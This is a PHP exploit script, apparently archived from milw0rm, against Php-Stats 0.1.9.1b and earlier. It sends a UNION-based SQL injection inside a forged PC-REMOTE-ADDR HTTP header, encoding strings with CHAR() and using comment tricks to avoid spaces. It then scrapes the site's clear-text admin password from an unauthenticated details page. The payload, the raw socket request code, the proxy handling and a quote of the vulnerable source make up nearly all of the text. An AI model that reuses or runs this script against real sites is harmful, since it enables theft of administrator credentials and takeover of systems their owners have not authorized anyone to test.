<?php
print_r('
---------------------------------------------------------------------------
Php-Stats <= 0.1.9.1b PC-REMOTE-ADDR sql injection / cleat text admin pass
disclosure
by rgod
mail: retrog at alice dot it
site: http://retrogod.altervista.org
---------------------------------------------------------------------------
');

if ($argc<3) {
    print_r('
---------------------------------------------------------------------------
Usage: php '.$argv[0].' host path OPTIONS
host:      target server (ip/hostname)
path:      path to phpstats
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' localhost /stats/ -P1.1.1.1:80
php '.$argv[0].' localhost /php-stats/stats/ -p81
---------------------------------------------------------------------------
');
    die;
}

error_reporting(7);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function send($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    $parts[1]=(int)$parts[1];
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$proxy="";
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=(int)str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

function my_enc($my_string)
{
  $encoded="CHAR(";
  for ($k=0; $k<=strlen($my_string)-1; $k++)
  {
    $encoded.=ord($my_string[$k]);
    if ($k==strlen($my_string)-1) {$encoded.=")";}
    else {$encoded.=",";}
  }
  return $encoded;
}
/*
vulnerable code, php-stats.recphp.php, line 41:
...
if(isset($_SERVER['REMOTE_ADDR'])) $ip=(isset($_SERVER['HTTP_PC_REMOTE_ADDR']) ? $_SERVER['HTTP_PC_REMOTE_ADDR'] : $_SERVER['REMOTE_ADDR']);
...

vulnerable query, line 146:

...
$result=$php_stats_rec->php_stats_sql_query("SELECT data,lastpage,user_id,visitor_id,reso,colo,os,bw,giorno,level FROM $option[prefix]_cache WHERE user_id='$ip' LIMIT 1");
...

oh, this is unpatched in php-stats.recphp.php... tze tze
you can never never trust http headers!

*/

$SQL="1.1.1.999'/**/UNION/**/SELECT/**/null,null,CONCAT(".my_enc("<!--").",value,".my_enc("-->")."),null,null,null,null,null,null,null/**/FROM/**/php_stats_config/**/WHERE/**/name='admin_pass'/*";
$packet ="GET ".$p."php-stats.recphp.php HTTP/1.0\r\n";
$packet.="PC-REMOTE-ADDR: $SQL\r\n";
$packet.="User-Agent: Mozilla/5.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
send($packet);

//see visitor details page for results, pass is obfuscated inside html, under the last visitor IP field
//this action can be normally performed without to be logged in

$packet ="GET ".$p."admin.php?action=details HTTP/1.0\r\n";
$packet.="User-Agent: Mozilla/5.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
send($packet);
$t=explode("whois.php?IP=<!--",$html);
$t2=explode("-->",$t[1]);
$pass=$t2[0];
echo "admin pass -> ".$pass."\n";

?>

# milw0rm.com [2007-03-16]
